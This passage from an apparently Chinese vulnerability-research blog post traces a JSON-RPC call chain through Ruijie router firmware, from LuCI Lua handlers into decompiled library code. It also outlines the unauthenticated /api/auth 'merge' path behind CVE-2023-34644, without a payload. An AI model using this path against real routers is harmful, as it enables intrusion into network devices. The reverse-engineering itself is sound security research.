<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>resolve</code> 函数主要是将 <code>mod</code> 表中存放键值对中的函数提取出来，假设 <code>method</code> 为 <code>devCap.get</code> ，那么下面的代码最后可以将匿名函数 <code>devCap[&quot;get&quot;]</code> 赋值给 <code>mod</code> 并返回</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>分析 <code>proxy(method, json.params or &#123;&#125;)</code> 发现，将刚刚解析的返回值 <code>method</code> 被 <code>proxy</code> 函数当做参数，这里的 <code>method</code> 又传入了 <code>luci.util</code> 文件中的 <code>copcall</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>copcall</code> 函数主要是对 <code>coxpcall</code> 的一个封装</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copcall</span><span class="params">(f, ...)</span></span></span><br><span class="line">	<span class="keyword">return</span> coxpcall(f, copcall_id, ...)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>终于在 <code>coxpcall</code> 函数内部发现调用了 <code>f</code> </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">coxpcall</span><span class="params">(f, err, ...)</span></span></span><br><span class="line">	<span class="keyword">local</span> res, co = oldpcall(<span class="built_in">coroutine</span>.<span class="built_in">create</span>, f)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>oldpcall(coroutine.create, f)</code> 这行代码的目的是在一个新的协程中运行函数 <code>f</code> 。至此开始执行上面提到的匿名函数，重新回顾一下它的代码，该函数调用了 <code>doParams</code> 对 <code>json</code> 数据进行解析，随后调用了 <code>fetch</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br></pre></td></tr></table></figure>



<p>这个 <code>fetch</code> 函数在 <code>cmd.lua</code> 文件中已经定义了，这里调用了 <code>fn</code> 也就是 <code>fetch</code> 函数传入进来的第一个参数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>fetch</code> 函数的第一个参数为 <code>model.fetch</code> ，<code>model</code> 是 <code>require &quot;dev_cap.lua&quot;</code> 后的结果，所以在 <code>cmd.lua</code> 的 <code>fetch</code> 函数内部调用了 <code>dev_sta.lua</code> 文件中定义的 <code>fetch</code> 函数，该函数定义如下，能够看到最后是调用了 <code>/usr/lib/lua/libuflua.so</code> 文件中的 <code>client_call</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>用 <code>IDA</code> 打开 <code>/usr/lib/lua/libuflua.so</code> 文件，发现并没有看到有定义的 <code>client_call</code> 函数，不过发现了 <code>uf_client_call</code> 函数，猜测可能是程序内部进行了关联。<code>shift+f12</code> 搜索字符串发现并没有看到 <code>client_call</code> （如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651514.png" alt="image-20230822105021327"></p>
<p>大概率说明 <code>IDA</code> 没有把 <code>client_call</code> 解析成字符串，而是解析成了代码。我这里用 <code>010Editor</code> 打开该文件进行搜索字符串 <code>client_call</code>，成功搜索到后发现其地址位于 <code>0xff0</code> 处</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651567.png" alt="image-20230822105722385" style="zoom:67%;" />



<p>可以看到 <code>IDA</code> 确实是将 <code>0xff0</code> 位置的数据当做了代码来解析，选中这部分数据，按 <code>a</code> ，就能以字符串的形式呈现了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651468.png" alt="image-20230822105929868"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651476.png" alt="image-20230822110053012"></p>
<p>对字符串 <code>client_call</code> 进行交叉引用，发现最终调用位置如下，<code>luaL_register</code> 是 <code>Lua</code> 中注册 <code>C</code> 语言编写的函数，它作用是将 <code>C</code> 函数添加到一个 <code>Lua</code> 模块中，使得这些 <code>C</code> 函数能够从 <code>Lua</code> 代码中被调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651426.png" alt="image-20230822111240902"></p>
<p>该函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaL_register</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *libname, <span class="type">const</span> luaL_Reg *l)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lua_State *L</code>：<code>Lua</code> 状态指针，代表了一个 <code>Lua</code> 解释器实例。</li>
<li><code>const char *libname</code>：模块的名称，这个名称会在 <code>Lua</code> 中作为一个全局变量存在，存放模块的函数。</li>
<li><code>const luaL_Reg *l</code>：一个结构体数组，包含要注册到模块中的函数的信息。每个结构体包含函数的名称和相应的 <code>C</code> 函数指针</li>
</ul>
<p>这里重点关注第三个参数，这就说明 <code>0x1101C</code> 的位置存放的是一个字符串以及一个函数指针（如下图），因此判断出 <code>client_call</code> 实际就定义在了 <code>sub_A00</code> 中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651435.png" alt="image-20230822111950548"></p>
<p><code>sub_A00</code> 函数定义如下，可以看到最后是调用了 <code>uf_client_call</code> 函数，而在这之前的很多赋值操作如 <code>*(_DWORD *)(v3 + 12) = lua_tolstring(a1, 4, 0);</code> ，很容易能猜测到其实是在解析 <code>Lua</code> 传入的各个参数字段。在 <code>Lua</code> 的代码中 <code>uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)</code> 这里传入了多个参数，但是 <code>sub_A00</code> 函数就一个参数 <code>a1</code> ，结合的操作分析出这里是在解析参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......    </span><br></pre></td></tr></table></figure>

<p><code>uf_client_call</code> 函数是一个引用外部库的函数，用 <code>grep</code> 在整个文件系统搜索字符串 <code>uf_client_call</code> ，结合 <code>/usr/lib/lua/libuflua.so</code> 文件中引用的外部库进行分析，最终判断出 <code>uf_client_call</code> 函数定义在 <code>/usr/lib/libunifyframe.so</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651524.png" alt="image-20230822132450393"></p>
<p><code>uf_client_call</code> 函数首先判断了 <code>method</code> 的类型，然后解析出报文中各字段的值，并将其键值对添加到一个 <code>JSON</code> 对象中，接着将最终处理好的 <code>JSON</code> 对象转换为 <code>JSON</code> 格式的字符串，通过 <code>uf_socket_msg_write</code> 用 <code>socket</code> 套接字进行数据传输</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v5 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )<span class="comment">//这里的*a1指的就是uf_call.client_call函数的第一个参数ctype,他取决于method它在dev_sta.lua文件中被赋值为了2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v17 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">......</span><br><span class="line">LABEL_22:<span class="comment">//接下来使用了大量的json_object_object_add函数，该函数的作用是在已有的JSON对象中添加一个键值对，以json_object_object_add(v20, &quot;remoteIp&quot;, v23)函数为例，作用是将&#123;&quot;remote&quot;,v23&#125;这个键值对添加到v20所指的JSON对象中，</span></span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;method&quot;</span>, v19);</span><br><span class="line">      v20 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">      v21 = json_object_new_string(a1[<span class="number">2</span>]);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br><span class="line">      v22 = a1[<span class="number">5</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;remoteIp&quot;</span>, v23);</span><br><span class="line">LABEL_35:</span><br><span class="line">      v25 = a1[<span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v25 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = json_object_new_string(v25);</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;remotePwd&quot;</span>, v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">9</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;buf&quot;</span>, v27);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v29 )</span><br><span class="line">            json_object_object_add(v20, <span class="string">&quot;force&quot;</span>, v29);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_56:</span><br><span class="line">            json_object_object_add(v31, v32, v30);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_57:</span><br><span class="line">      v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_58:</span><br><span class="line">      <span class="keyword">if</span> ( v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_url&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_file&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;multi&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v36 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v36 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;not_commit&quot;</span>, v36);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = json_object_new_boolean(*((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v37 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;async&quot;</span>, v37);</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v38 || !*v38 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      v39 = json_object_new_string(v38);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;data&quot;</span>, v39);</span><br><span class="line">LABEL_78:</span><br><span class="line">      v41 = (_BYTE *)a1[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v41 &amp;&amp; *v41 )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = json_object_new_string(v41);</span><br><span class="line">        <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v20);</span><br><span class="line">          json_object_put(v5);</span><br><span class="line">          v40 = <span class="number">630</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;device&quot;</span>, v42);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;params&quot;</span>, v20);<span class="comment">//将上面的v20当做了params的值，向v5中添加新的键值对</span></span><br><span class="line">      v43 = json_object_to_json_string(v5);<span class="comment">//json_object_to_json_string作用是将JSON对象转换为JSON格式的字符串</span></span><br><span class="line">......</span><br><span class="line">      v44 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line">      v50 = <span class="built_in">strlen</span>(v43);</span><br><span class="line">      uf_socket_msg_write(v44, v43, v50);<span class="comment">//最终调用uf_socket_msg_write，用socket实现了进程间通信，将解析好的json数据发送给其他进程进行处理</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>既然存在 <code>uf_socket_msg_write</code> 进行数据发送，那么肯定就在一个地方有用 <code>uf_socket_msg_read</code> 函数进行数据的接收，用 <code>grep</code> 进行字符串搜索，发现 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，并且该文件还位于 <code>/etc/init.d</code> 目录下，这意味着该进程最初就会启动并一直存在，所以判断出这个 <code>unifyframe-sgi.elf</code> 文件就是用来接收 <code>libunifyframe.so</code> 文件所发送过来的数据</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651516.png" alt="image-20230822145039327"></p>
<h4 id="219版本之前的调用链"><a href="#219版本之前的调用链" class="headerlink" title="219版本之前的调用链"></a>219版本之前的调用链</h4><p>该调用链是 <strong>winmt</strong> 师傅在 <a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2023-34644">CVE-2023-34644 </a> 利用的，在 <code>219</code> 之前该调用链可以通杀大部分锐捷的路由器。下面介绍这条调用链所出示的代码均来自 <code>EW1200GI</code> 型号 软件版本为 <code>EW_3.0(1)B11P204</code> 的固件</p>
<p>在 <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中，配置了路由 <code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code></p>
<p>这意味着当用户访问 <code>/api/auth</code> 路径时，将调用 <code>rpc_auth</code> 。在 <code>luci</code> 框架中 <code>sysauth</code> 属性控制是否需要进行系统级的用户认证才能访问该路由，这里的 <code>sysauth</code> 属性为 <code>false</code> ，表示无需进行系统认证即可访问。</p>
<p><code>rpc_auth</code> 函数首先引入了一些模块，然后获取 <code>HTTP_CONTENT_LENGTH</code> 的长度是否大于 <code>1000</code> 字节，如果不大于的话会将准备 <code>HTTP</code> 响应的类型设置为 <code>application/json</code> ，下面的 <code>handle</code> 函数第一个参数 <code>_tbl</code> 传入的是 <code>luci.modules.noauth</code> 文件返回的内容</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>到了 <code>handle</code> 函数内部后的流程与分析最新版的步骤一样，就不再赘述，最后的结果就是能在这里触发<code>noauth</code> 文件中的 <code>merge</code> 函数（前提是报文中要设置 <code>method</code> 字段的值为 <code>merge</code>）</p>
<p><code>noauth</code> 的文件中定义了 <code>merge</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>merge</code> 函数又调用了 <code>/usr/lib/lua/luci/modules/cmd.lua</code> 文件中的 <code>devSta.set</code> 函数，之后的过程又和上文中分析最新版的步骤一样，也不再重复记录</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br></pre></td></tr></table></figure>



